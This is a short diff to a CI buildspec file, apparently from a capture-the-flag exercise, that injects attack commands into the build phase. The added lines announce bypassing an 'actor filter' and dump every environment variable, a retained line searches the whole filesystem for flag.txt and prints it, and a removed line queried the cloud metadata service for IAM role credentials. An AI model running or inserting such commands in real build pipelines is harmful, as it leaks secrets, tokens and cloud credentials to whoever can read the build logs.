@@ -2,7 +2,6 @@ version: 0.2
 phases:
   build:
     commands:
-      - echo "!!! BUILD TRIGGERED !!!"
-      - env | grep -i "FLAG" || echo "Flag not in env"
+      - echo "Bypassing Actor Filter..."
+      - env
       - find / -name "flag.txt" 2>/dev/null -exec cat {} +
-      - curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ && echo " [IAM Role Found]"
